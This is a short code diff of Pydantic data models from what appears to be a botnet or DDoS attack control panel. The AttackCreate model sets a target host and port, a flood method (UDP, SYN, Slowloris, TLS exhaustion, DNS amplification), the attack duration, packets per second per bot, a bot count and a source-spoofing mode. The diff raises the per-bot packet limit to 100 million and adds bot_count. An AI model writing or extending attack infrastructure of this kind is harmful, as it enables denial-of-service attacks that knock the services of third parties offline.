@@ -90,15 +90,15 @@ class BotThrottle(BaseModel):
 class AttackCreate(BaseModel):
     target_host: str
     target_port: int = Field(..., ge=1, le=65535)
-    method: str = Field(default="UDP", pattern="^(UDP|TCP|HTTP|SYN|ICMP|MIX|SLOWLORIS|TLS_EXHAUST|DNS_AMP|GAME_MIMIC|MEGA)$")
+    method: str = Field(default="UDP", pattern="^(UDP|MEGA|SYN|TLS_EXHAUST|HTTP|SLOWLORIS|DNS_AMP)$")
     duration_secs: int = Field(default=60, ge=1, le=3600)
-    pps_per_bot: int = Field(default=100000, ge=1, le=5000000)
+    pps_per_bot: int = Field(default=100000, ge=1, le=100000000)
+    bot_count: int = Field(default=1, ge=1, le=100)
     spoof_mode: int = Field(default=0, ge=0, le=2)
     fragmentation: bool = False
     slowloris: bool = False
     tls_exhaust: bool = False
     dns_amp: bool = False
-    game_mimic: bool = False
     mega_mode: bool = False
 
 class AttackOut(BaseModel):
